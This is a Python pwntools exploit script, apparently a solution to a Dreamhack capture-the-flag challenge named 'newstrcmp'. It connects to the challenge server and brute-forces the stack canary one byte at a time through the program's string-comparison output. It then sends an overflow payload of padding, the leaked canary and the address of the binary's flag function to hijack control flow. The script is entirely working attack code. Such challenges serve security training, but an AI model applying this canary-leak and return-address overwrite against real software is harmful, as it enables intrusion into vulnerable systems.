from pwn import *
context.binary = exe = ELF('./newstrcmp')
#p = process(exe.path)

p = remote("host1.dreamhack.games", 13180)
context.log_level = "debug"

#gdb.attach(p,gdbscript='''
#           b*0x0000000000401482
#           ''')
input()
def read(a,b):
    p.sendafter(b'(y/n):',b'n')
    p.sendafter(b's1:',a)
    p.sendafter(b's2:',b)
    return
count = 0
can = str("00")
for i in range(25,32):
    a = 0
    while True:
        a = a+1
        read(b'a'*i + p8(a),b'a'*i)
        b = p.recvline()
        if b != b" Result of newstrcmp: s1 is smaller than s2, first differs at %d\n" %(i):
            can = str(hex(a))[2:] + can            
            count += 1
            log.info(f'found {count}: {bytes([i])}')
            break
print("before: ",can)
can = int(can,16)
print("after: ",can)
input()
p.sendlineafter(b'(y/n):',b'n')
p.sendafter(b's1:',b'k')
input()
p.sendafter(b's2:',b'a'*0x18 + p64(can) + p64(0) + p64(exe.sym.flag))
p.sendafter('Exit? (y/n):',b'y')
p.interactive()
